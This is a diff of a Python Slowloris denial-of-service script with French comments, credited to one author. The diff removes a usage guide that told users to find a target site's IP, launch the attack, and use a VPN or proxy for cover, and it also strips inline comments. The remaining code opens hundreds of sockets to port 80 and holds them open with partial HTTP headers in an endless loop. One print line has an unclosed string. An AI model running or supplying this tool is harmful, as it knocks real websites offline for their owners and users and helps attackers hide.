@@ -1,21 +1,5 @@
 """
-Modèle d'attaque de type slow loris basé sur le principe de u/adrianchifor.
-
-#Utilisation :
-Commencez par trouver l'adresse IP du target. Pour cela, utilisez l'invité de commande (cmd).
-- Tapez la commande suivante : ping "url"
-L'adresse IP correspondante s'affichera.
-- Tapez ensuite la commande suivante : python slowloris.py "adresse_ip"
-L'attaque a desormais commencé.
-
-#Précautions à prendre :
-Nous vous conseillons d'utiliser un VPN / Proxy avant de débuter l'attaque slow loris.
-
-Modules utilisiés :
-socket - random - time - sys.
-Présent fondamentalement dans Python.
-
-Développé par @ZakyHamdoun.
+author: ZakyHamdoun
 """
 
 import socket
@@ -32,27 +16,25 @@ sockets = []
 
 def initSocket(ip):
     """
-    Initialisation du socket qui
-    sera envoyé à l'adresse ip choisie.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     s.connect((ip, 80))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8")) #CRÉATION DE LA REQUÊTE GET.
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
 
     for header in headers:
-        s.send("{}\r\n".format(header).encode("utf-8")) #ENVOI...
+        s.send("{}\r\n".format(header).encode("utf-8"))
 
     return s
 
 if __name__ == "__main__": #START
     if len(sys.argv) != 2:
-        print("Utiliser le programme de la manière suivante : python {} example.com".format(sys.argv[0])) #EXPLICATION - USAGE.
+        print("Utiliser le programme de la manière suivante : python {} example.com".format(sys.argv[0]))
         sys.exit()
 
     ip = sys.argv[1]
     count = 200
-    print("Début d'envoi des socket {}. Connection à l'adresse. {} sockets.".format(ip, count)) #DÉBUT - LOG - ENVOI...
+    print("Début d'envoi des socket {}. Connection à l'adresse. {} sockets.".format(ip, count))
 
     for _ in range(count):
         try:
@@ -64,11 +46,11 @@ if __name__ == "__main__": #START
         sockets.append(s)
 
     while True:
-        print("Connecté à {} sockets. Sending headers.format(len(sockets))) #ENVOI...
+        print("Connecté à {} sockets. Sending headers.format(len(sockets)))
 
         for s in list(sockets):
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8")) #ENVOI...
+                s.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
             except socket.error:
                 sockets.remove(s)
 
@@ -77,8 +59,8 @@ if __name__ == "__main__": #START
             try:
                 s = initSocket(ip)
                 if s:
-                    sockets.append(s) #RÉOUVERTURE DES SOCKETS.
+                    sockets.append(s)
             except socket.error:
                 break
 
-        time.sleep(15) #TEMPS PAR SOCKET.
+        time.sleep(15)
